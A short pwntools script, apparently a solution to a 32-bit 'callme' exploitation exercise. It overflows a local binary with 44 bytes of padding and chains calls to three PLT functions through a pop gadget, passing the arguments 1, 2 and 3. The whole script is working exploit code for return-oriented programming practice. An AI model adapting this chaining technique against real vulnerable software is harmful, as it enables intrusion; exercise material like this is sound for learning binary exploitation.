from pwn import *

p = process('./callme32')

callme_one_plt = 0x080485C0
callme_two_plt = 0x08048620
callme_three_plt = 0x080485B0
pop_addr = 0x80488a9
pad = 'A'*44

payload = pad
payload += p32(callme_one_plt)+p32(pop_addr)+p32(1)+p32(2)+p32(3)
payload += p32(callme_two_plt)+p32(pop_addr)+p32(1)+p32(2)+p32(3)
payload += p32(callme_three_plt)+p32(pop_addr)+p32(1)+p32(2)+p32(3)

p.sendline(payload)
p.interactive()

